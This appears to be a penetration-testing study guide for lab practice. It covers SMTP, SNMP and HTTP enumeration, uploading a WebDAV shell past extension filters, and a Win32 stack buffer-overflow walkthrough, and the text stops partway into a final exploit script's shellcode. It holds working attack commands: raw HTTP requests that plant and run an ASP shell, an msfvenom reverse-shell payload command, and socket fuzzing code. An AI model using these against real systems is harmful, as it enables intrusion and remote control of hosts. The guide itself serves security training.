<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ nc -C <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#ae81ff">25</span> <span style="color:#75715e"># remember to use `-C` in `nc`! This will force nc to send a CRLF (`\r\n`) as line-ending. A normal `\n` will not work! Telnet will work by default.</span>
<span style="color:#ae81ff">220</span> dj.acme.local Microsoft ESMTP MAIL Service, Version: 5.0.2195.6713 ready at  Mon, <span style="color:#ae81ff">19</span> Mar <span style="color:#ae81ff">2018</span> 07:27:59 +0200
VRFY barry
<span style="color:#ae81ff">250</span> 2.1.5 &lt;barry@barry&gt; <span style="color:#75715e"># user exists</span>
VRFY administrator
<span style="color:#ae81ff">550</span> 5.1.1 administrator... User unknown <span style="color:#75715e"># user does not exist</span>
VRFY bob
<span style="color:#ae81ff">252</span> 2.1.5 Cannot VRFY user, but will take message <span style="color:#66d9ef">for</span> &lt;bob@dj.acme.local&gt; <span style="color:#75715e"># servers configured properly to not VRFY a user</span>

EXPN postmaster
<span style="color:#ae81ff">250</span> 2.1.5 root &lt;root@barry&gt;
EXPN root
<span style="color:#ae81ff">250</span> 2.1.5 root &lt;root@barry&gt;
</code></pre></div><p>Use intel gathered from the passive information gathering stage to generate a users list to <code>VRFY</code> against the SMTP servers.</p>
<p>Although, SMTP configurations allowing for this type of enumeration is uncommon, there are many services and protocols with overly verbose output messages, which at times, allow us to find out interesting information, such as whether a user exist in their system using bruteforce.</p>
<p>Resources:</p>
<ul>
<li><a href="https://pentestlab.blog/tag/expn/">https://pentestlab.blog/tag/expn/</a></li>
<li>A list of unix usernames: <code>/usr/share/metasploit-framework/data/wordlists/unix_users.txt</code>.</li>
</ul>
<h2 id="snmp-enumeration">SNMP Enumeration</h2>
<p>UDP Port 161</p>
<p>Simple Network Management Protocol. Based on UDP, susceptible to IP spoofing, and replay attacks. SNMP protocols 1, 2, and 2c offer no traffic encryption, meaning SNMP information and credentials can be easily intercepted over a local network. Traditional SNMP protocols also have weak authentication schemes, and are commonly left configured with default public and private community strings.</p>
<h3 id="mib-tree">MIB Tree</h3>
<p>SNMP Management Information Base</p>
<ul>
<li>Branches - Organizations or network functions</li>
<li>Leaves - Final endpoints, specific variable values that can be probed</li>
</ul>
<h3 id="scanning-for-snmp">Scanning for SNMP</h3>
<h4 id="finding-snmp-services-with-nmap">Finding SNMP services with <code>nmap</code></h4>
<p><code>nmap -sU -p 161 --open [ip]</code></p>
<h4 id="finding-snmp-services-with-onesixtyone">Finding SNMP services with <code>onesixtyone</code></h4>
<p>Common community strings:</p>
<ul>
<li><code>public</code></li>
<li><code>private</code></li>
<li><code>manager</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo public &gt; community
echo private &gt;&gt; community
echo manager &gt;&gt; community
<span style="color:#66d9ef">for</span> ip in <span style="color:#66d9ef">$(</span>seq <span style="color:#ae81ff">1</span> 254<span style="color:#66d9ef">)</span>; <span style="color:#66d9ef">do</span> echo 10.11.1.$ip; <span style="color:#66d9ef">done</span> &gt; ips
onesixtyone -c community -i ips
</code></pre></div><h3 id="windows-snmp-enumeration-example">Windows SNMP Enumeration Example</h3>
<p>We can probe and query the SNMP service, with at least the read-only community string, in most cases, <code>public</code>. SNMP services offer a wealth of information.</p>
<ul>
<li><code>snmp-check -c public -v 1 [ip]</code> - Enumerate entire MIB tree, and outputs in a very friendly, human-readable manner</li>
<li><code>snmpwalk -c public -v 1 [ip]</code> - Enumerate entire MIB tree</li>
<li><code>snmpwalk -c public -v 1 [ip] [oid]</code> - Enumerate specific information</li>
</ul>
<p>MIB OIDs:</p>
<ul>
<li><code>1.3.6.1.2.1.25.1.6.0</code> - System Processes</li>
<li><code>1.3.6.1.2.1.25.4.2.1.2</code> - Running Programs</li>
<li><code>1.3.6.1.2.1.25.4.2.1.4</code> - Processes Path</li>
<li><code>1.3.6.1.2.1.25.2.3.1.4</code> - Storage Units</li>
<li><code>1.3.6.1.2.1.25.6.3.1.2</code> - Software Name</li>
<li><code>1.3.6.1.4.1.77.1.2.25</code> - User Accounts</li>
<li><code>1.3.6.1.2.1.6.13.1.3</code> - TCP Local Ports</li>
</ul>
<h2 id="http-enumeration">HTTP Enumeration</h2>
<h3 id="enumerating-web-server-and-web-technology-versions">Enumerating Web Server and Web Technology Versions</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">curl -i <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#75715e"># include response headers</span>
curl -I <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#75715e"># show info only (using HEAD)</span>
curl -L <span style="color:#f92672">[</span>ip<span style="color:#f92672">]</span> <span style="color:#75715e"># follow redirects</span>
</code></pre></div><h3 id="directory-fuzzing">Directory Fuzzing</h3>
<h4 id="gobuster"><code>gobuster</code></h4>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">gobuster -u http://website.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">100</span> | tee gobuster.log
gobuster -u http://website.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t <span style="color:#ae81ff">100</span> -c <span style="color:#e6db74">&#39;PHPSESSION=123&#39;</span> -x .php,.html | tee gobuster.log
</code></pre></div><h4 id="dirsearch"><code>dirsearch</code></h4>
<p>Great for websites that have extensions (eg. php). Added <code>wp</code> to dicc.txt</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">./dirsearch.py -u http://192.168.1.23 -e txt -t <span style="color:#ae81ff">50</span> <span style="color:#75715e"># use dirsearch&#39;s default dict, which proved to be quite successful</span>
./dirsearch.py -u http://192.168.1.23 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php -t <span style="color:#ae81ff">50</span>
</code></pre></div><h3 id="nikto-web-scanner"><code>nikto</code> Web Scanner</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">nikto -h 192.168.1.23
nikto -h 192.168.1.23 -Plugins outdated
</code></pre></div><p>A function within its code, &ldquo;map_codes&rdquo;, seems to take forever to finish. Add a <code>return;</code> statement to line 228 of <code>/var/lib/nikto/plugins/nikto_core.plugin</code> to patch it.</p>
<h3 id="wpscan-wordpress-scanner"><code>wpscan</code> Wordpress Scanner</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">wpscan -u example.com --enumerate p,t,u,tt <span style="color:#75715e"># plugins, themes, usernames and timthumbs --log wpscanlog</span>
</code></pre></div><p>Note, after installing either neovim or samba-4.5.15, wpscan stops working.</p>
<h3 id="webdav-in-iis-servers">WebDAV in IIS Servers</h3>
<ol>
<li>If you notice an IIS Server, scan for WebDAV using <code>nmap --script=http-webdav-scan,http-iis-webdav-vuln</code> (vuln checks for protected folders that can by bypassed)</li>
<li>Find unprotected/protected folders</li>
</ol>
<ul>
<li>If protected, bypass by:
<ul>
<li>Adding a <code>Translate: f</code> header</li>
<li>Inserting the characters <code>%c0%af</code> into any uri request longer than 1 character</li>
</ul>
</li>
</ul>
<ol start="3">
<li>Identify file types that can be uploaded and executed (accessed) with <code>davtest -cleanup -url http://url/folder</code></li>
<li>Use msfvenom to generate and upload PHP (if PHP is available) or ASP shell using PUT request</li>
</ol>
<ul>
<li>If <code>.php</code> or <code>.asp</code> cannot be uploaded, upload it as an acceptable file type like <code>.txt</code></li>
<li>Perform a COPY or MOVE request to rename the <code>.txt</code> back into <code>.php</code> or <code>.asp</code></li>
<li>If that doesn&rsquo;t work, try using the semicolon bypass by renaming it to <code>shell.php;.txt</code> or <code>shell.asp;.txt</code></li>
</ul>
<ol start="5">
<li>Open a listener and access your shell by visiting your shell page or by using a GET request</li>
</ol>
<p>Generating Shell Payload</p>
<ul>
<li>ASP Shell Msfvenom: <a href="http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html">http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html</a></li>
</ul>
<p>Bypassing Protected Folders</p>
<ul>
<li><a href="https://blog.skullsecurity.org/2009/webdav-detection-vulnerability-checking-and-exploitation">https://blog.skullsecurity.org/2009/webdav-detection-vulnerability-checking-and-exploitation</a></li>
<li><a href="https://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf">https://secureyes.net/nw/assets/Bypassing-IIS-6-Access-Restrictions.pdf</a></li>
</ul>
<p>Bypassing Restricted File Type Uploads</p>
<ul>
<li>WebDAV Upload Bypass with COPY: <a href="http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html">http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html</a></li>
<li>Semicolon Vulnerability: <a href="https://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/">https://soroush.secproject.com/blog/2009/12/microsoft-iis-semi-colon-vulnerability/</a></li>
</ul>
<p>Other Resources:</p>
<ul>
<li>Typical Full Flow: <a href="http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html">http://web.archive.org/web/20171016091511/http://www.r00tsec.com:80/2011/09/exploiting-microsoft-iis-version-60.html</a></li>
<li>WebDAV Metasploit Module Examples: <a href="http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html">http://carnal0wnage.attackresearch.com/2010/05/more-with-metasploit-and-webdav.html</a></li>
</ul>
<h4 id="ways-to-interact-with-webdav-server">Ways to Interact with WebDAV Server</h4>
<p>5 Methods to Upload to WebDAV</p>
<ul>
<li><a href="http://www.hackingarticles.in/5-ways-to-exploiting-put-vulnerability/">http://www.hackingarticles.in/5-ways-to-exploiting-put-vulnerability/</a></li>
</ul>
<h5 id="cadaver"><code>cadaver</code></h5>
<pre><code>cadaver http://[ip]/[folder]
put, copy, move, get, etc.
</code></pre><h5 id="webdav-interaction-with-burpsuite">WebDAV Interaction with BurpSuite</h5>
<p>Note: It is important to leave the whitespaces after the request, to let the server know that you have completed stating your request, just like in nc, otherwise the server will wait and hang.</p>
<p>Retrieve properties of a resource</p>
<pre><code>PROPFIND / HTTP/1.1
Host: 192.168.1.23
Content-Type: text/xml
Content-Length: 147
Depth: 0
Translate: f

&lt;?xml version=&quot;1.0&quot;?&gt;
&lt;a:propfind xmlns:a=&quot;DAV:&quot;&gt;
&lt;a:prop&gt;&lt;a:getcontenttype/&gt;&lt;/a:prop&gt;
&lt;a:prop&gt;&lt;a:getcontentlength/&gt;&lt;/a:prop&gt;
&lt;/a:propfind&gt;


</code></pre><p>Directory listing</p>
<pre><code>GET / HTTP/1.1
Host: 192.168.1.23


</code></pre><p>Upload ASP shell with .txt extension to WebDAV using PUT</p>
<pre><code>PUT /shell.txt HTTP/1.1
Host: 192.168.1.23
Content-Length: 38337

[ASP shellcode content here]
</code></pre><p>Move shell.txt to shell.asp;.txt</p>
<pre><code>COPY /shell.txt HTTP/1.1
Host: 192.168.1.23
Destination: http://192.168.1.23/shell.asp%3b.txt


</code></pre><p>Execute shell.asp;.txt, make sure to open a nc listener on port 443</p>
<pre><code>GET /shell.asp%3b.txt HTTP/1.1
Host: 192.168.1.23


</code></pre><h3 id="cgi">CGI</h3>
<ul>
<li>Use <code>/usr/share/seclists/Discovery/Web_Content/cgis.txt</code> wordlist to find cgi pages.</li>
<li><code>searchsploit apache cgi</code></li>
<li><code>nmap --script=http-shellshock --script-args uri=/cgi-bin/test.cgi --script-args uri=/cgi-bin/admin.cgi</code></li>
</ul>
<h3 id="php">PHP</h3>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh"><span style="color:#75715e"># PHP 5.5.9 search order, edit if necessary, eg. php version, windows?.</span>
searchsploit --colour -t php <span style="color:#ae81ff">5</span> | grep -v <span style="color:#e6db74">&#39;/dos/\|/windows&#39;</span> | grep -iP <span style="color:#e6db74">&#39;^(php|apache \+ php) (\d|&lt;)&#39;</span>
searchsploit --colour -t php 5.5 | grep -v <span style="color:#e6db74">&#39;/dos/\|/windows&#39;</span> | grep -iP <span style="color:#e6db74">&#39;^(php|apache \+ php) (\d|&lt;)&#39;</span>
searchsploit --colour -t php 5.x | grep -v <span style="color:#e6db74">&#39;/dos/\|/windows&#39;</span> | grep -iP <span style="color:#e6db74">&#39;^(php|apache \+ php) (\d|&lt;)&#39;</span>
</code></pre></div><h3 id="http-enumeration-tips">HTTP Enumeration Tips</h3>
<h4 id="wordlists">Wordlists</h4>
<ul>
<li>Dirsearch - ~/tools/dirsearch/db/dicc.txt</li>
<li>DirB - /usr/share/dirb/wordlists/</li>
<li>wfuzz - /usr/share/wfuzz/wordlist/</li>
<li>SecList - /usr/share/seclists/
<ul>
<li>/usr/share/seclists/Discovery/Web_Content/</li>
<li>/usr/share/seclists/Discovery/Web_Content/common.txt</li>
<li>/usr/share/seclists/Discovery/Web_Content/cgis.txt</li>
</ul>
</li>
</ul>
<h4 id="hardcoded-links">Hardcoded Links</h4>
<p>If a website has hardcoded links like &ldquo;<a href="http://pinkdb.com">http://pinkdb.com</a>&rdquo; or &ldquo;http://172.16.5.5&rdquo;, which you do not have access to, simply an entry like <code>[actual server ip] [hardcoded value]</code> (eg. <code>192.168.1.23 pinkydb.com</code>) to <code>/etc/hosts</code></p>
<h4 id="apache-directory-default-layouts">Apache Directory Default Layouts</h4>
<p><a href="https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29">https://wiki.apache.org/httpd/DistrosDefaultLayout#Debian.2C_Ubuntu_.28Apache_httpd_2.x.29</a></p>
<h4 id="host-header">Host Header</h4>
<p>The host-Header tells the webserver which virtual host to use. Sometimes servers may behave differently when the host-header is changed from their IP to their hostname (example.com).</p>
<h4 id="lookout-for">Lookout For</h4>
<ul>
<li>Apache mod_x, as they may be vulnerable</li>
<li>WebDAV</li>
<li>CGI</li>
</ul>
<h2 id="ident-enuemeration">ident Enuemeration</h2>
<h3 id="ident-user-enum"><code>ident-user-enum</code></h3>
<p>Identify owners of processes</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">ident-user-enum 192.168.1.23 <span style="color:#ae81ff">22</span> <span style="color:#ae81ff">113</span> <span style="color:#ae81ff">139</span> <span style="color:#ae81ff">445</span>
</code></pre></div><h1 id="vulnerability-scanning">Vulnerability Scanning</h1>
<h2 id="vulnerability-scanning-with-nmap">Vulnerability Scanning with Nmap</h2>
<p>NSE scripts that scans for vulnerabilities are at <code>ls -l /usr/share/nmap/scripts/*vuln*</code>.</p>
<ul>
<li><code>nmap -p 80 --script=all 192.168.1.23</code> - Scan a target using all NSE scripts. May take an hour to complete.</li>
<li><code>nmap -p 80 --script=*vuln* 192.168.1.23</code> - Scan a target using all NSE vuln scripts.</li>
<li><code>nmap -p 80 --script=http*vuln* 192.168.1.23</code> - Scan a target using all HTTP vulns NSE scripts.</li>
<li><code>nmap -p 21 --script=ftp-anon 192.168.1.0/24</code> - Scan entire network for FTP servers that allow anonymous access.</li>
<li><code>nmap -p 80 --script=http-vuln-cve2010-2861 192.168.1.0/24</code> - Scan entire network for a directory traversal vulnerabilitiy. It can even retrieve admin&rsquo;s password hash.</li>
</ul>
<h2 id="the-openvas-vulnerability-scanner">The OpenVAS Vulnerability Scanner</h2>
<h3 id="openvas-initial-setup">OpenVAS Initial Setup</h3>
<p><code>openvas-setup</code></p>
<p>Apparently, the program will fail. Thankfully, OpenVAS is already installed on the OffSec VM: <a href="https://forums.offensive-security.com/showthread.php?3216-05-2-1-Changes-to-quot-OpenVAS-Initial-Setup-quot-(openvas-setup)&amp;p=12828#post12828">https://forums.offensive-security.com/showthread.php?3216-05-2-1-Changes-to-quot-OpenVAS-Initial-Setup-quot-(openvas-setup)&amp;p=12828#post12828</a> and <a href="https://forums.offensive-security.com/showthread.php?10139-OpenVas-Setup-issue&amp;p=54721#post54721">https://forums.offensive-security.com/showthread.php?10139-OpenVas-Setup-issue&amp;p=54721#post54721</a></p>
<p>Just run the following commands to get it up and running.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">openvasmd --user<span style="color:#f92672">=</span>admin --new-password<span style="color:#f92672">=</span>NEW_PASSWORD
service redis-server start
service greenbone-security-assistant start
service openvas-scanner start
service openvas-manager start
firefox https://127.0.0.1:9392
</code></pre></div><p>Add new target -&gt; add new scan using target -&gt; run</p>
<h1 id="buffer-overflows">Buffer Overflows</h1>
<h2 id="fuzzing">Fuzzing</h2>
<p>Fuzz base on buffer length and perhaps different characters, check for crashes, and observe memory stack in debugger.</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/env python</span>

<span style="color:#f92672">import</span> socket
string <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;A&#39;</span>

<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">100</span>, <span style="color:#ae81ff">10000</span>, <span style="color:#ae81ff">200</span>):
    <span style="color:#66d9ef">print</span> <span style="color:#e6db74">&#39;Fuzzing PASS with {} bytes&#39;</span><span style="color:#f92672">.</span>format(i)
    s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()
    s<span style="color:#f92672">.</span>connect((<span style="color:#e6db74">&#39;192.168.1.23&#39;</span>, <span style="color:#ae81ff">110</span>))
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;USER test</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
    s<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1024</span>)
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;PASS {}</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span><span style="color:#f92672">.</span>format(string <span style="color:#f92672">*</span> i))
    s<span style="color:#f92672">.</span>send(<span style="color:#e6db74">&#39;QUIT</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">&#39;</span>)
    s<span style="color:#f92672">.</span>close()
</code></pre></div><h1 id="win32-buffer-overflows">Win32 Buffer Overflows</h1>
<p>Stack overflow simulation</p>
<pre><code>ESP -&gt; 1000 .... \
       1001 .... |- # Current function
       1002 .... |
       1003 .... /
EBP -&gt; 1003 100A # Previous EBP further down
       1004 3AFD # Return address to previous calling function
       1005 ....
       1006 ....
</code></pre><pre><code>ESP -&gt; 1000 AAAA \
       1001 AAAA |- # Current function
       1002 AAAA |
       1003 AAAA /
EBP -&gt; 1003 AAAA # Previous EBP further down
       1004 BBBB # Return address to previous calling function
       1005 CCCC
       1006 ....
</code></pre><pre><code># Function completes, and starts cleaning up.
# leave (mov esp, ebp)

       1000 AAAA \
       1001 AAAA |- # Current function
       1002 AAAA |
       1003 AAAA /
EB/SP-&gt;1003 AAAA # Previous EBP further down
       1004 BBBB # Return address to previous calling function
       1005 CCCC
       1006 ....
</code></pre><pre><code># leave (pop ebp) (ebp is now AAAA, and esp + 1)

       1000 AAAA \
       1001 AAAA |- # Current function
       1002 AAAA |
       1003 AAAA /
       1003 AAAA
ESP -&gt; 1004 BBBB # Return address to previous calling function
       1005 CCCC
       1006 ....
</code></pre><pre><code># ret (pop eip) (eip is now BBBB, and esp + 1)

       1000 AAAA
       1001 AAAA
       1002 AAAA
       1003 AAAA
       1004 BBBB # Return address to previous calling function, popped as EIP
ESP -&gt; 1005 CCCC
       1006 ....
</code></pre><pre><code># jmp esp

ESP -&gt; 1005 NOPS # nop sled to avoid shellcode from &quot;stepping on its toes&quot; while decoding
       1006 NOPS
       1007 CCCC # shellcode
       1008 CCCC
       1009 CCCC
       100A CCCC
</code></pre><h2 id="crashing">Crashing</h2>
<p>With fuzzing, see whether server crashes after a certain length buffer.</p>
<ul>
<li>Fuzz</li>
<li>Check for crash</li>
</ul>
<h2 id="controlling-eip">Controlling EIP</h2>
<p>With a debugger like Immunity Debugger, see whether EIP is overwritten with your buffer.</p>
<ol>
<li>Run vulnerable server</li>
<li>Open Immunity Debugger</li>
<li>Attach server process</li>
<li>Run</li>
<li>Send long buffer</li>
<li>In Immunity Debugger check whether EIP has been overwritten</li>
</ol>
<h2 id="find-offset">Find Offset</h2>
<ol>
<li>Use <code>/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l [length]</code> to create a cyclic pattern with the buffer length</li>
<li>Restart server and debugger</li>
<li>Send buffer</li>
<li>Record overwritten EIP</li>
<li>Use <code>/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q [eip value]</code> to find offset</li>
<li>Update buffer with new offset, and enter a custom value to overwrite EIP.</li>
<li>Pad the buffer to see how much more bytes you can fill in the stack after overwriting EIP. If the EIP does not get overwritten anymore, your buffer is too long, decrease the appended padding size. Anything above 500 bytes will be good to go, as most shellcode sizes are 300-500 bytes.</li>
</ol>
<h2 id="check-for-bad-characters">Check for Bad Characters</h2>
<ol>
<li>Replace the appended padding with:</li>
</ol>
<pre><code>badchars = (
'\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10'
'\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20'
'\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30'
'\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40'
'\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50'
'\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60'
'\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70'
'\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80'
'\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90'
'\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0'
'\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0'
'\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0'
'\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0'
'\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0'
'\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0'
'\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff')
</code></pre><ol start="2">
<li>Restart server and debugger</li>
<li>Send buffer</li>
<li>Right click on ESP and follow in memory dump</li>
<li>Check whether any of the bytes are missing. A quick way is to look through the last column and see whether all the xF aligns</li>
</ol>
<pre><code>   01 02 03 04 05 06 07 08 09 0a 0b 0c 0d 0e 0f
192.168.1.23 14 15 16 17 18 19 1a 1b 1c 1d 1e 1f
20 21 22 23 24 25 26 27 28 29 2a 2b 2c 2d 2e 2f
30 31 32 33 34 35 36 37 38 39 3a 3b 3c 3d 3e 3f
40 41 42 43 44 45 46 47 48 49 4a 4b 4c 4d 4e 4f
50 51 52 53 54 55 56 57 58 59 5a 5b 5c 5d 5e 5f
60 61 62 63 64 65 66 67 68 69 6a 6b 6c 6d 6e 6f
70 71 72 73 74 75 76 77 78 79 7a 7b 7c 7d 7e 7f
80 81 82 83 84 85 86 87 88 89 8a 8b 8c 8d 8e 8f
90 91 92 93 94 95 96 97 98 99 9a 9b 9c 9d 9e 9f
a0 a1 a2 a3 a4 a5 a6 a7 a8 a9 aa ab ac ad ae af
b0 b1 b2 b3 b4 b5 b6 b7 b8 b9 ba bb bc bd be bf
c0 c1 c2 c3 c4 c5 c6 c7 c8 c9 ca cb cc cd ce cf
d0 d1 d2 d3 d4 d5 d6 d7 d8 d9 da db dc dd de df
e0 e1 e2 e3 e4 e5 e6 e7 e8 e9 ea eb ec ed ee ef
f0 f1 f2 f3 f4 f5 f6 f7 f8 f9 fa fb fc fd fe ff
</code></pre><ol start="6">
<li>Record bad characters, including <code>0x00</code> as that is a null byte. Keep them in mind when finding a <code>JMP</code> location and when generating shellcode later on</li>
</ol>
<h2 id="finding-a-register-to-jump-to-your-shellcode">Finding a Register to Jump to Your Shellcode</h2>
<ol>
<li>Restart server and debugger, keeping it paused</li>
<li>Send buffer and crash the service</li>
<li>Check out the registers, find one that points to the buffer you sent, or somewhere close. In this case the register ESP points directly after the overwritten EIP</li>
<li>Right click on top-left assembly window</li>
<li>Search for &gt; Command</li>
<li>Enter <code>jmp esp</code></li>
<li>Ensure the address does not include bad characters</li>
<li>Record the address of the instruction</li>
</ol>
<h3 id="alternatives">Alternatives</h3>
<p>If no results were found in step 4, try Search for &gt; Sequence of commands, enter the following, and use that address instead:</p>
<pre><code>push esp
retn
</code></pre><p>If there are still no results, try finding those commands elsewhere in the program&rsquo;s DLLs with Mona.</p>
<ol>
<li>List all DLLs being used with <code>!mona modules</code> at the bottom of Immunity Debugger</li>
<li>Try finding a module that has nearly all security features in &ldquo;False&rdquo; state (Rebase, SafeSEH, ASLR, NXCompat)</li>
<li>Click on <code>e</code> in Immunity Debugger to open &ldquo;Executable Modules&rdquo; window</li>
<li>Locate the module and double click on it</li>
<li>Repeat steps 2-6 in the previous section to search for instructions</li>
</ol>
<p>If there are still no results, which is uncommon for complex modules, no worries. The default &ldquo;Search for&rdquo; function in Immunity Debugger only searches within executable regions, which is usually in the <code>.text</code> segment of the module, which can be viewed by clicking on <code>m</code> in Immunity Debugger. Notice the <code>R E</code> in the same row as the module&rsquo;s <code>.text</code> segment. If the program is compiled with DEP support, the <code>JMP ESP</code> would <strong>have</strong> to be located within <code>.text</code> segment. If it is not, fortunately you can find the instructions in non-executable segments as well.</p>
<p>Since we can&rsquo;t use Immunity Debugger &ldquo;Search for&rdquo; function, we&rsquo;ll have to use Mona to find the instructions for us</p>
<ol>
<li>Find the opcode for the <code>JMP ESP</code> instruction with <code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</code> and type in <code>jmp esp</code>. The result is <code>FFE4</code></li>
<li>In Immunity Debugger, type <code>!mona find -s &quot;\xff\xe4&quot; -m [module.dll]</code> to search for the instruction within the entire module</li>
<li>Pick a result that does not contain any bad characters in the address</li>
<li>Jump to the address location by clicking on the black &ldquo;wall bang&rdquo;-looking button in the Immunity Debugger toolbar, and entering the address</li>
<li>Confirm that the instructionn is <code>JMP ESP</code></li>
<li>Record the address of the instruction</li>
</ol>
<h3 id="linux-objdump">Linux Objdump</h3>
<p>You can use Kali to find the offset of certain instructions from let&rsquo;s say a DLL:</p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">objdump -D -M intel user32.dll | grep <span style="color:#e6db74">&#39;jmp.*esp&#39;</span> | head
</code></pre></div><h2 id="generate-shellcode">Generate Shellcode</h2>
<ol>
<li>Generate shellcode payload with <code>msfvenom -p windows/shell_reverse_tcp -a x86 --platform windows LHOST=192.168.1.23 LPORT=443 -f c -b '\x00' -e x86/shikata_ga_nai EXITFUNC=thread</code>, swap out with your listener IP and port, bad chars with <code>-b '\x00,\x0A,\x0D'</code> for example, etc. The <code>EXITFUNC=thread</code> ensures that only the thread serving your exploit is terminated, not the entire process by default</li>
<li>Paste in a NOP sled of about 16 <code>\x90</code>s after the overwritten EIP, and then the shellcode, and then the padding. Since the shellcode decoder is going to require some workspace in the stack (the same area where the shellcode is being stored), it will require some buffer space to avoid &ldquo;stepping on its own toes&rdquo;.</li>
<li>Open a listener and pop the shell</li>
</ol>
<h2 id="example-final-code">Example Final Code</h2>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#75715e">#!/usr/bin/python</span>

<span style="color:#f92672">import</span> socket
s <span style="color:#f92672">=</span> socket<span style="color:#f92672">.</span>socket()

shellcode <span style="color:#f92672">=</span> (
<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xc1\xba\x8d\x2f\x0e\x1c\xd9\x74\x24\xf4\x5d\x29\xc9\xb1</span><span style="color:#e6db74">&#34;</span>
